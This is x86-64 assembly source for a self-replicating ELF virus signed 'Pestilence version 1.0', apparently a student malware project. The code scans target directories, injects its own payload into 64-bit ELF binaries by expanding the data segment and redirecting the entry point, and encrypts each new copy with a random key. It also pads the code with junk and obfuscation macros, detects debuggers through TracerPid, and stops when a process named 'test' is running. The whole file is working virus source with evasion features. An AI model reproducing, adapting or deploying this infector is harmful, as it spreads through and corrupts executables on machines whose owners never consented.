%include "asm/header.s"

section .text
global _start

_start:
	PUSHAQ
	BIG_OBF
key:
	mov rdi, 0x8037ee39550c7610
	JNK2
	mov rsi, 0x8037ee39550c7610

	lea rax, [rel key]
	sub r10, r10
	OBF
	xor r10, main - key
	add rax, r10
	OBF
	cmp rdi, rsi
	je no_decryptor

	JNK2
	lea rsi, [rel encryption_start]
	lea rdx, [rel encryption_end]
	sub rdx, rsi
	push rax
	OBF
	call decryptor
	pop rax
	no_decryptor:
	BIG_OBF
	jmp rax
	db 0xeb

decryptor:	;rdi:key  rsi:addr rdx:size
	ENTER_OBF
	cmp rdi, 0
	je ret_
	xor rcx, rcx
	while_decrypt:
		OBF
		cmp rcx, rdx
		jge end_decryptor
		trunc_key:
			mov r9, rdx
			sub r9, rcx
			OBF
			cmp r9, 8
			jg end_trunc	; no need to trunc
			mov r10, r9
			mov r9, 8
			sub r9, r10
			JNK2
			imul r9, 8
			push rcx
			mov rcx, r9
			OBF
			shl rdi, cl
			shr rdi, cl
			pop rcx
		end_trunc:
		mov r9, QWORD [rsi]
		xor r9, rdi
		JNK1
		mov QWORD [rsi], r9
		add rsi, 8
		add rcx, 8
		OBF
		jmp while_decrypt
		db 0xeb
	end_decryptor:
	jmp ret_
	db 0xeb

encryption_start:
memcpy:
	ENTER_OBF
	BIG_OBF
	mov rcx, rdx
	cld
	rep movsb
	jmp ret_
	db 0xeb

memset:
	ENTER_OBF
	mov rax, rsi
	mov rcx, rdx
	cld
	rep stosb
	jmp ret_
	db 0xeb

strcmp:
	ENTER_OBF
	push r8
	dec rsi
	dec rdi
	strcmp_while:
		inc rdi
		inc rsi
		mov r8b, byte[rdi]
		cmp r8b, 0
		je end_strcmp_while
		cmp r8b, byte[rsi]
		je strcmp_while
	end_strcmp_while:
	xor rax, rax
	mov al, byte[rdi]
	sub al, byte[rsi]
	pop r8
	jmp ret_
	db 0xeb

strcat:
	ENTER_OBF
	push r8
	push rdi
	call strlen
	pop rdi
	add rdi, rax
	dec rsi
	strcat_while:
		inc rsi
		mov r8b, byte[rsi]
		mov byte[rdi], r8b
		inc rdi
		cmp byte[rsi], 0
		jne strcat_while
	mov byte[rdi], 0
	pop r8
	jmp ret_
	db 0xeb

strlen:
	ENTER_OBF
	push rsi
	mov rax, 0
	mov rsi, rdi
	dec rsi
	strlen_while:
		inc rsi
		cmp byte[rsi], 0
		jne strlen_while
	sub rsi, rdi
	mov rax, rsi
	pop rsi
	jmp ret_
	db 0xeb

check_addr:		;	rdi:elf_struc  rsi:addr
	ENTER_OBF
	push r13
	mov r13, QWORD[rdi + elf_struc.ptr_end]
	mov rdi, QWORD[rdi + elf_struc.ptr]
	cmp rsi, rdi
	jl check_addr_ret_0
	cmp rsi, r13
	jg check_addr_ret_0
	mov rax, 1
	jmp check_addr_ret
	check_addr_ret_0:
	mov rax, 0
	check_addr_ret:
	pop r13
	jmp ret_
	db 0xeb

check_str_in_addr:	; rdi:elf_struc rsi:str
	ENTER_OBF
	chk_one_byte:
	push rdi
	push rsi
	call check_addr
	pop rsi
	pop rdi
	cmp rax, 0
	je ret_0
	mov al, BYTE[rsi]
	inc rsi
	cmp al, 0
	jne chk_one_byte
	mov rax, 1
	jmp ret_
	db 0xeb

modify_sections:
	ENTER_OBF
	mov r8, rdi									;r8 contient elf_struc
	mov r9, QWORD[r8 + elf_struc.ehdr]			;r9 contient ehdr
	xor r10, r10
	JNK2
	mov r10, QWORD[r9 + ehdr.e_shoff]
	add r10, r9									;r10 contient les shdr

	mov r11, QWORD[r8 + elf_struc.data_phdr]
	mov r12, QWORD[r11 + phdr.p_offset]
	OBF
	add r12, QWORD[r11 + phdr.p_filesz]
	mov r11, r12								;r11 contient l'addr ou le code sera inséré
	xor rcx, rcx
	mov cx, WORD[r9 + ehdr.e_shnum]
	xor rbx, rbx
	dec rbx
	JNK1
	while_shdr_to_modify:
		inc rbx
		BIG_OBF
		cmp rbx, rcx
		je end_while_data_shdr
		JNK1
		mov rax, SHDR_SIZE
		mul rbx
		lea rdi, [r10 + rax]	; rdi: current shdr

		mov esi, DWORD[rdi + shdr.sh_type]
		JNK2
		cmp rax, 8
		je while_shdr_to_modify ; if not bss section
		mov rax, QWORD[rdi + shdr.sh_offset]
		cmp rax, r11
		jl while_shdr_to_modify ; if shdr.offset >= dataphdr.offset + dataphdr.filesz
			mov rax, QWORD[r8 + elf_struc.bits_added]
			add QWORD[rdi + shdr.sh_offset], rax
			BIG_OBF
			mov rax, QWORD[rdi + shdr.sh_addr]
			cmp rax, 0
			je while_shdr_to_modify
				mov rax, QWORD[r8 + elf_struc.bits_added]
				JNK1
				add QWORD[rdi + shdr.sh_addr], rax
		jmp while_shdr_to_modify
	end_while_shdr_to_modify:
	mov rax, 1
	JNK2
	jmp ret_
	db 0xeb

modify_segments:
	ENTER_OBF
	OBF
	mov r8, rdi									;r8 contient elf_struc
	mov r9, QWORD[r8 + elf_struc.ehdr]			;r9 contient ehdr
	xor r10, r10
	mov r10, QWORD[r9 + ehdr.e_phoff]
	JNK1
	add r10, r9									;r10 contient les phdr
	mov QWORD[r8 + elf_struc.data_phdr], 0

	mov rdi, r8
	OBF
	mov rsi, r10
	call check_addr								;check phoff addr
	cmp rax, 0
		je ret_0

	xor rcx, rcx
	JNK2
	mov cx, WORD[r9 + ehdr.e_phnum]
	mov rax, PHDR_SIZE
	mul rcx
	lea rsi, [r10 + rax]
	mov rdi, r8
	call check_addr
	cmp rax, 0
		je ret_0								;check all phdr
	JNK1
	xor rcx, rcx
	mov cx, WORD[r9 + ehdr.e_phnum]
	xor rbx, rbx
	dec rbx
	while_data_phdr:
		inc rbx
		BIG_OBF
		cmp rbx, rcx
		je end_while_data_shdr
		mov rax, PHDR_SIZE
		mul rbx
		lea rdi, [r10 + rax]	; rdi: current phdr
		JNK1

		mov eax, DWORD[rdi + phdr.p_type]
		cmp eax, 1
		jne end_if_data_phdr1
		OBF
		mov r11, QWORD[rdi + phdr.p_offset]
		mov r12, QWORD[r8 + elf_struc.data_shdr]
		mov r12, QWORD[r12 + shdr.sh_offset]
		cmp r11, r12
		jg end_if_data_phdr1
		add r11, QWORD[rdi + phdr.p_filesz]
		OBF
		cmp r11, r12
		jl end_if_data_phdr1						; if phdr is data phdr
			mov DWORD[rdi + phdr.p_flags], 7
			mov QWORD[r8 + elf_struc.data_phdr], rdi ; data_phdr = phdr;
			mov rax, QWORD[rdi + phdr.p_vaddr]
			add rax, QWORD[rdi + phdr.p_memsz]
			JNK2
			mov QWORD[r8 + elf_struc.new_entry], rax ; new_entry = phdr->p_vaddr + phdr->p_memsz;
			mov rax, QWORD[rdi + phdr.p_memsz]
			sub rax, QWORD[rdi + phdr.p_filesz]
			mov QWORD[r8 + elf_struc.bss_size], rax ; bss_size = phdr->p_memsz - phdr->p_filesz;
			add	QWORD[r8 + elf_struc.bits_added], rax ; bits_added += bss_size;
			mov rax, QWORD[rdi + phdr.p_offset]
			OBF
			add rax, QWORD[rdi + phdr.p_filesz]
			mov QWORD[r8 + elf_struc.new_code_offset], rax ; new_code_offset = phdr->p_offset + phdr->p_filesz;
			jmp while_data_phdr
		end_if_data_phdr1:
		mov rax, QWORD[r8 + elf_struc.data_phdr]
		BIG_OBF
		cmp rax, 0
		je end_if_data_phdr2
		mov r11, QWORD[rax + phdr.p_offset]
		add r11, QWORD[rax + phdr.p_filesz]
		OBF
		mov rax, QWORD[rdi + phdr.p_offset]
		JNK1
		cmp rax, r11
		jl end_if_data_phdr2
			mov rax, QWORD[r8 + elf_struc.bits_added]
			add QWORD[rdi + phdr.p_offset], rax
			JNK2
			mov rax, QWORD[rdi + phdr.p_vaddr]
			cmp rax, 0
			jmp end_if_data_phdr2
			mov rax, QWORD[r8 + elf_struc.bits_added]
			add QWORD[rdi + phdr.p_vaddr], rax
			JNK1
			add QWORD[rdi + phdr.p_paddr], rax
		end_if_data_phdr2:
		jmp while_data_phdr
	end_while_data_phdr:
	mov rax, QWORD[r8 + elf_struc.data_phdr]
	OBF
	jmp ret_
	db 0xeb

fill_data_sec:
	ENTER_OBF
	OBF
	mov r8, rdi									;r8 contient elf_struc
	mov r9, QWORD[r8 + elf_struc.ehdr]			;r9 contient ehdr
	xor r10, r10
	OBF
	mov r10, QWORD[r9 + ehdr.e_shoff]
	add r10, r9									;r10 contient les shdr
	JNK1
	mov QWORD[r8 + elf_struc.data_shdr], 0

	mov rsi, r10
	mov rdi, r8
	BIG_OBF
	call check_addr
	cmp rax, 0
		je ret_0

	xor rcx, rcx
	mov cx, WORD[r9 + ehdr.e_shnum]
	mov rax, SHDR_SIZE
	mul rcx

	lea rsi, [r10 + rax]
	mov rdi, r8
	OBF
	call check_addr
	cmp rax, 0
		je ret_0
	; all sections are tested

	xor rcx, rcx
	mov bx, WORD[r9 + ehdr.e_shnum]
	mov cx, WORD[r9 + ehdr.e_shstrndx]
	cmp cx, bx
		jge ret_0
	mov rax, SHDR_SIZE
	JNK1
	mul rcx
	lea rax, [r10 + rax]
	mov rsi, [rax + shdr.sh_offset]
	lea rsi, [r9 + rsi]
	mov QWORD[r8 + elf_struc.shdr_names], rsi
	mov rdi, r8
	OBF
	call check_addr
	cmp rax, 0
		je ret_0

	xor rcx, rcx
	JNK2
	mov cx, WORD[r9 + ehdr.e_shnum]
	xor rbx, rbx
	dec rbx
	while_data_shdr:
		inc rbx
		OBF
		cmp rbx, rcx
		je end_while_data_shdr
		mov rax, SHDR_SIZE
		mul rbx
		JNK1
		lea rdi, [r10 + rax]	; rdi: current shdr
		push rdi

		xor rdx, rdx
		mov edx, DWORD[rdi + shdr.sh_name]
		mov rsi, QWORD[r8 + elf_struc.shdr_names]
		add rsi, rdx
		JNK2
		push rsi
		mov rdi, r8
		BIG_OBF
		call check_str_in_addr	; check if str has good addresses
		pop rdi
		cmp rax, 0
		je end_while_data_shdr
		
		lea rsi, [rel data_name]
		call strcmp
		cmp rax, 0
		pop rdi
		jne while_data_shdr
		JNK2
		mov QWORD[r8 + elf_struc.data_shdr], rdi
		jmp while_data_shdr
	end_while_data_shdr:

	mov rax, QWORD[r8 + elf_struc.data_shdr]
	jmp ret_
	db 0xeb

encrypt_new_gen:	; rdi:bin_addr
	ENTER_OBF
	push rdi
	sub rsp, 8
	lea rdi, [rel rand_file]
	mov rsi, OPEN_FILE_PERMISSION
	SYS_NUM sys_open
	OBF
	syscall

	cmp rax, 0
	jl didnt_work
	mov rdi, rax
	mov rsi, rsp
	mov rdx, 8
	push rax
	SYS_NUM sys_read
	OBF
	syscall
	pop rax

	mov rdi, rax
	SYS_NUM sys_close
	OBF
	syscall

	jmp worked
	didnt_work:
	xor rdi, rdi
	mov QWORD[rsp], rdi
	worked:
	mov rdi, QWORD[rsp]		;rdi has the key
	add rsp, 8

	pop rsi					;rsi has the addr
	mov rdx, rsi
	add rdx, key - _start
	JNK1
	mov QWORD[rdx + 2], rdi	;modify the key in new gen code

	mov rdx, encryption_start - _start
	add rsi, rdx
	OBF
	mov rdx, encryption_end - encryption_start
	call decryptor

	jmp ret_
	db 0xeb

change_fingerprint:	;rdi:addr   rsi:key
	ENTER_OBF
	mov rcx, 8
	OBF
	shr rsi, 32
	dec rdi
		JNK1
	while_rcx:
		cmp rcx, 0
		je while_rcx_end
		dec rcx
		inc rdi

		JNK2
		mov rdx, rsi
		shl rdx, 60
		shr rdx, 60
		shr rsi, 4
		cmp rdx, 10
		jge alphabet_num
		OBF
		add rdx, 0x30
		mov BYTE[rdi], dl
		jmp while_rcx
		alphabet_num:
		BIG_OBF
		add rdx, 0x37
		mov BYTE[rdi], dl
		jmp while_rcx
	while_rcx_end:
	OBF
	jmp ret_
	db 0xeb

rewrite_binary:
	ENTER_OBF
	mov r11, rdi	;r11 contient elf_struc

	mov rdi, 0
	BIG_OBF
	mov rsi, QWORD[r11 + elf_struc.stat + stat.st_size]
	add rsi, QWORD[r11 + elf_struc.bits_added]
	mov rdx, MMAP_PROT
	mov r10, MAP_ANONYMOUS | MAP_PRIVATE
	mov r9, r8
	OBF
	inc r9
	sub r8, r9
	mov r9, r8
	inc r9
	SYS_NUM sys_mmap
	push r11
	JNK1
	syscall
	pop r11
	JNK2
	cmp rax, 0
	jl ret_0
	mov QWORD[r11 + elf_struc.new_bin_addr], rax

	OBF
	mov rbx, QWORD[r11 + elf_struc.bits_added]
	mov rax, QWORD[r11 + elf_struc.ehdr]
	add QWORD[rax + ehdr.e_shoff], rbx			;e_shoff += bits_added

	OBF	
	mov rax, QWORD[r11 + elf_struc.ehdr]
	mov rbx, QWORD[r11 + elf_struc.new_entry]
	mov QWORD[rax + ehdr.e_entry], rbx			;e_entry = new_entry

	OBF
	mov rax, QWORD[r11 + elf_struc.data_phdr]
	JNK1
	mov rbx, QWORD[r11 + elf_struc.bits_added]
	add QWORD[rax + phdr.p_filesz], rbx			;dataphdr.p_filesz += bits_added

	mov rbx, QWORD[rax + phdr.p_filesz]
	mov QWORD[rax + phdr.p_memsz], rbx			;dataphdr.p_memsz = p_filesz

	JNK2
	mov rax, QWORD[r11 + elf_struc.new_code_offset]
	cmp rax, QWORD[r11 + elf_struc.stat + stat.st_size]
	jg ret_0									;check if payload can be wrote

	mov r13, 0									;bits written
	mov rdi, QWORD[r11 + elf_struc.new_bin_addr]
	mov rsi, QWORD[r11 + elf_struc.ptr]
	BIG_OBF
	mov rdx, QWORD[r11 + elf_struc.new_code_offset]
	call memcpy											;copie du debut du bin
	add r13, QWORD[r11 + elf_struc.new_code_offset]

	mov rdi, QWORD[r11 + elf_struc.new_bin_addr]
	add rdi, r13
	mov rsi, 0
	BIG_OBF
	mov rdx, QWORD[r11 + elf_struc.bss_size]
	call memset											;copie de la bss
	add r13, QWORD[r11 + elf_struc.bss_size]

	mov rdi, QWORD[r11 + elf_struc.new_bin_addr]
	add rdi, r13
	JNK1
	lea rsi, [rel _start]
	mov rdx, PAYLOAD_SIZE
	OBF
	call memcpy											;copie du payload
	add r13, PAYLOAD_SIZE

	lea rbx, [rel jmp_old_entry]
	lea rax, [rel end]
	sub rax, rbx
	sub rax, 2
	JNK2
	mov rdi, QWORD[r11 + elf_struc.new_bin_addr]
	add rdi, r13
	sub rdi, rax								; addr to jump on old entry
	mov rax, QWORD[r11 + elf_struc.new_entry]
	sub rax, QWORD[r11 + elf_struc.old_entry]
	mov QWORD[rdi], rax

	; ENCRYPTION
	mov rdi, QWORD[r11 + elf_struc.new_bin_addr]
	add rdi, r13
	sub rdi, PAYLOAD_SIZE
	push r11
	BIG_OBF
	call encrypt_new_gen
	pop r11

	; change the fingerprint
	mov rdi, QWORD[r11 + elf_struc.new_bin_addr]
	add rdi, r13
	sub rdi, PAYLOAD_SIZE
	JNK1
	mov rsi, rdi
	add rsi, encryption_start - _start
	mov rsi, QWORD[rsi]
	add rdi, fingerprint - _start
	JNK2
	call change_fingerprint

	mov rdi, QWORD[r11 + elf_struc.new_bin_addr]
	add rdi, r13
	mov rsi, QWORD[r11 + elf_struc.ehdr]
	add rsi, QWORD[r11 + elf_struc.new_code_offset]
	OBF
	mov rdx, QWORD[r11 + elf_struc.stat + stat.st_size]
	sub rdx, QWORD[r11 + elf_struc.new_code_offset]
	add r13, rdx
	call memcpy									;copi la fin du bin

	mov rdi, QWORD[r11 + elf_struc.path]
	mov rsi, 513
	OBF
	SYS_NUM sys_open
	push r11
	syscall
	pop r11
	mov QWORD[r11 + elf_struc.fd2], rax
	JNK1
	cmp rax, 0
	jl ret_0					; open the good file

	mov rdi, rax
	mov rsi, QWORD[r11 + elf_struc.new_bin_addr]
	mov rdx, r13
	SYS_NUM sys_write
	push r11
	syscall
	pop r11

	mov rdi, QWORD[r11 + elf_struc.new_bin_addr]
	xor rsi, rsi
	sub rsi, QWORD[r11 + elf_struc.stat + stat.st_size]
	neg rsi
	add rsi, QWORD[r11 + elf_struc.bits_added]
	OBF
	SYS_NUM sys_munmap
	push r11
	syscall
	pop r11

	mov rdi, QWORD[r11 + elf_struc.fd2]
	SYS_NUM sys_close
	syscall

	jmp ret_1
	db 0xeb

infect_elf:		; r8:elf_struc
	ENTER_OBF
	mov r8, rdi
	mov rax, QWORD[r8 + elf_struc.stat + stat.st_size]
	cmp rax, 64								; test if ehdr is in the file
	jl infect_elf_end
	mov rdi, QWORD[r8 + elf_struc.ptr]
	mov QWORD[r8 + elf_struc.ehdr], rdi
	mov rsi, QWORD[r8 + elf_struc.stat + stat.st_size]
	add rdi, rsi
	mov QWORD[r8 + elf_struc.ptr_end], rdi  ; fill ptr_end

	mov rdi, QWORD[r8 + elf_struc.ehdr]
	mov edi, DWORD[rdi + ehdr.ei_mag]
	cmp edi, 0x464c457f
	jne infect_elf_end						; check magic number

	mov rdi, QWORD[r8 + elf_struc.ehdr]
	mov sil, BYTE[rdi + ehdr.ei_class]
	cmp sil, 2								; check 64 bits
	jne infect_elf_end

	mov si, WORD[rdi + ehdr.e_type]
	cmp si, 2
	je continue_infection
	cmp si, 3								; check elf type
	je continue_infection
	jmp infect_elf_end

	continue_infection:
	mov QWORD[r8 + elf_struc.bits_added], PAYLOAD_SIZE		; bits_added = sizeof(payload)
	mov rax, QWORD[r8 + elf_struc.ehdr]
	mov rax, QWORD[rax + ehdr.e_entry]
	mov QWORD[r8 + elf_struc.old_entry], rax				; old_entry = sizeof(payload)
	mov rdi, r8
	call fill_data_sec
	cmp rax, 0
	je infect_elf_end

	mov rdi, r8
	call modify_segments
	cmp rax, 0
	je infect_elf_end

	mov rdi, QWORD[r8 + elf_struc.data_phdr]
	mov rsi, QWORD[rdi + phdr.p_offset]
	add rsi, QWORD[rdi + phdr.p_filesz]
	mov rdi, QWORD[r8 + elf_struc.ptr]
	add rdi, rsi
	mov rsi, end - signature
	sub rdi, rsi

	push rdi
	mov rsi, rdi
	mov rdi, r8
	call check_addr
	cmp rax, 0
	je infect_elf_end
	pop rdi

	mov rsi, QWORD[rel signature]
	mov rdi, QWORD[rdi]
	cmp rdi, rsi							;test if infected
	je infect_elf_end

	mov rdi, r8
	call modify_sections

	mov rdi, r8
	push r8
	call rewrite_binary
	pop r8
	cmp rax, 0
	je infect_elf_end

	infect_elf_end:
	jmp ret_
	db 0xeb

process_file:
	ENTER_OBF
	JNK1
	sub rsp, ELF_STRUC_SIZE
	mov QWORD[rsp + elf_struc.path], rdi

	OBF
	SYS_NUM sys_lstat
	lea rsi, [rsp + elf_struc.stat]
	syscall
	JNK1
	OBF
	cmp rax, 0
	jl process_file_end

	mov eax, DWORD [rsp + elf_struc.stat + stat.st_mode]
	and eax, TYPE_MASK
	JNK2
	cmp eax, DIRECTORY_MODE
	jne not_a_directory
		mov rdi, QWORD[rsp + elf_struc.path]
		OBF
		call strlen
		mov rdi, QWORD[rsp + elf_struc.path]
		mov byte[rdi + rax], 0x2f
		BIG_OBF
		mov byte[rdi + rax + 1], 0
		lea rsi, [rel process_file]
		OBF
		call process_dir
		jmp process_file_end
	not_a_directory:
	mov eax, DWORD [rsp + elf_struc.stat + stat.st_mode]
	and eax, TYPE_MASK
	cmp eax, FILE_MODE
	jne process_file_end

	mov rdi, QWORD[rsp + elf_struc.path]
	mov rsi, OPEN_FILE_PERMISSION
	JNK1
	SYS_NUM sys_open
	syscall						; opening the file
	
	mov QWORD[rsp + elf_struc.fd], rax
	cmp rax, 0
	jl process_file_end
	mov rax, QWORD[rsp + elf_struc.stat + stat.st_size]
	cmp rax, 0
	JNK1
	jle close_file

	mov rdi, 0
	mov rsi, QWORD[rsp + elf_struc.stat + stat.st_size]
	mov rdx, MMAP_PROT
	mov r10, MAP_PRIVATE
	xor r8, r8
	JNK2
	mov r8, QWORD[rsp + elf_struc.fd]
	mov r9, 0
	SYS_NUM sys_mmap
	syscall						;mmap the file
	
	mov QWORD[rsp + elf_struc.ptr], rax
	cmp rax, 0
	OBF
	jl close_file
	;infect routine

	JNK2
	mov rdi, rsp
	OBF
	call infect_elf

	;end of infect routine
	mov rdi, QWORD[rsp + elf_struc.ptr]
	xor rsi, rsi
	mov esi, DWORD[rsp + elf_struc.stat + stat.st_size]
	SYS_NUM sys_munmap			;munmap the file
	syscall

	close_file:
	mov edi, DWORD[rsp + elf_struc.fd]
	SYS_NUM sys_close
	syscall
	process_file_end:
	mov rax, 0
	jmp ret_
	db 0xeb

check_proc:
	ENTER_OBF
	sub rsp, NAME_SIZE + CONTENT_SIZE

	mov r8, rdi
	lea rdi, [rbp - NAME_SIZE]
	mov byte[rdi], 0
	mov rsi, r8
	call strcat
	lea rdi, [rbp - NAME_SIZE]
	BIG_OBF
	lea rsi, [rel proc_name_file]
	call strcat

	lea rdi, [rbp - NAME_SIZE]
	mov rsi, OPEN_PROC_PERMISSION
	OBF
	SYS_NUM sys_open
	syscall			;open the proc file
	
	mov r10, rax
	cmp rax, 0
	jl proc_ret_0

	mov rdi, rax
	lea rsi, [rsp]
	JNK1
	mov rdx, CONTENT_SIZE
	SYS_NUM sys_read
	syscall			;read the proc file
	
	mov byte[rsp + rax], 0
	cmp rax, 0
	jl proc_ret_0

	SYS_NUM sys_close
	mov rdi, r10
	syscall			;close the proc file
	

	lea rdi, [rsp]
	JNK2
	lea rsi, [rel proc_ban]
	call strcmp
	cmp rax, 0
	jne proc_ret_0

	mov rax, 1
	jmp proc_end
	proc_ret_0:
	mov rax, 0
	proc_end:
	jmp ret_
	db 0xeb

process_dir:			;  r12:fd   r13:folder   r9:getends ret    r8:buffer   r10:function pointer		r11:ret value
	ENTER_OBF
	JNK2
	sub rsp, DIRENT_SIZE + NAME_SIZE
	mov r13, rdi
	mov r10, rsi
	SYS_NUM sys_open
	JNK1
	mov rsi, OPEN_DIR_PERMISSION
	xor rdx, rdx
	syscall							; it opens the dir
	
	mov r12, rax
	cmp rax, 0
	jl end_process_dir
	read_dirent:
		mov rdi, r12
		lea rsi, [rsp]
		OBF
		mov rdx, DIRENT_SIZE
		SYS_NUM sys_getdents
		syscall						; it reads dir entries

		cmp rax, 0
		jle close_dir
		mov r9, rax
		add r9, rsp
		mov rcx, rsp
		file_listing:
			lea rdi, [rcx + linux_dirent.d_name]
			call strlen
			push rax
			OBF
			lea rdi, [rbp - NAME_SIZE]
			call strlen
			pop rdi
			add rax, rdi
			add rax, 2
			cmp rax, NAME_SIZE
			jg ret_

			lea rdi, [rcx + linux_dirent.d_name]
			lea rsi, [rel dot]
			BIG_OBF
			call strcmp
			cmp rax, 0
			je end_if_not_dot
			lea rdi, [rcx + linux_dirent.d_name]
			lea rsi, [rel ddot]
			JNK2
			call strcmp
			cmp rax, 0
			je end_if_not_dot
			;if entry not a dot or double dot
				lea rdi, [rbp - NAME_SIZE]
				mov byte[rdi], 0
				lea rsi, [r13]
				JNK1
				call strcat
				lea rdi, [rbp - NAME_SIZE]
				lea rsi, [rcx + linux_dirent.d_name]
				call strcat

				lea rdi, [rbp - NAME_SIZE]
				push r10
				push r11
				push rcx
				push r9
				JNK1
				push r12
				push r13
				OBF
				call r10
				pop r13
				pop r12
				pop r9
				JNK1
				pop rcx
				pop r11
				pop r10
				cmp rax, 1
				mov r11, 1
				je close_dir
				mov r11, 0
			end_if_not_dot:

			xor r8, r8
			mov r8w, WORD [rcx + linux_dirent.d_reclen]
			JNK1
			add rcx, r8
			cmp rcx, r9
			jl file_listing
		jmp read_dirent
	close_dir:
	push r11
	SYS_NUM sys_close
	mov rdi, r12
	syscall
	pop r11
	end_process_dir:
	mov rax, r11
	jmp ret_
	db 0xeb



check_debug:
	ENTER_OBF
	sub rsp, NAME_SIZE + 8
	lea rdi, [rel self_status]
	mov rsi, OPEN_PROC_PERMISSION
	SYS_NUM sys_open
	JNK2
	syscall
	cmp rax, 0
	mov QWORD[rsp], rax
	jl ret_0
	mov rdi, rax
	lea rsi, [rsp + 8]
	mov rdx, NAME_SIZE
	SYS_NUM sys_read
	OBF
	syscall
	mov rbx, rax
	sub rcx, rcx
	dec rcx
	while_trac_not_found:
		inc rcx
		cmp rcx, rbx
		je debuged_ret_0
		mov rdi, QWORD[rsp + 8 + rcx]
		JNK1
		mov rsi, 0x6950726563617254
		cmp rdi, rsi
		jne while_trac_not_found
	mov rax, rsi
	sub rax, rsi
	mov al, BYTE[rsp + 19 + rcx]
	cmp al, 0x30
	je debuged_ret_0

	mov rax, 1
	JNK2
	jmp debuged_end
	debuged_ret_0:
	mov rax, 0
	debuged_end:
	push rax
	mov rdi, QWORD[rsp + 8]
	SYS_NUM sys_close
	OBF
	syscall
	pop rax
	jmp ret_
	db 0xeb


main:
	BIG_OBF
	call check_debug
	cmp rax, 1
	je jmp_old_entry
	lea rdi, [rel proc_dir]
	JNK1
	lea rsi, [rel check_proc]
	OBF
	call process_dir
	JNK2
	cmp rax, 1
	je jmp_old_entry
	OBF
	lea rdi, [rel dir1]
	BIG_OBF
	lea rsi, [rel process_file]
	call process_dir
	lea rdi, [rel dir2]
	JNK2
	lea rsi, [rel process_file]
	BIG_OBF
	call process_dir
	jmp jmp_old_entry

ret_0:
	mov rax, 0
	leave
	ret
	db 0xeb

ret_1:
	mov rax, 1
	leave
	ret
	db 0xeb

ret_:
	leave
	ret
	db 0xeb

jmp_old_entry:
	mov rdi, 0x2322a163f2fcad26
	JNK2
	mov rsi, 0x2322a163f2fcad26
	cmp rdi, rsi
	jne the_jump							; exit if real famine
		SYS_NUM sys_exit
		sub rdi, rsi
		JNK1
		syscall
	the_jump:
	lea rax, [rel _start]
	sub rax, rdi
	POPAQ
	OBF
	jmp rax

dir1:
	db '/tmp/test/', 0
dir2:
	db '/tmp/test2/', 0
self_status:
	db '/proc/self/status', 0
proc_dir:
	db '/proc/', 0
proc_name_file:
	db '/comm', 0
proc_ban:
	db 'test', 0x0a, 0
new_line:
	db 0x0a, 0
rand_file:
	db '/dev/urandom', 0
dot:
	db '.', 0
ddot:
	db '..', 0
data_name:
	db '.data', 0
encryption_end:
	db 0
signature:
	db 'Pestilence version 1.0 (c)oded by gdelabro',0, ' - '
fingerprint:
	db '00000000', 0
end:
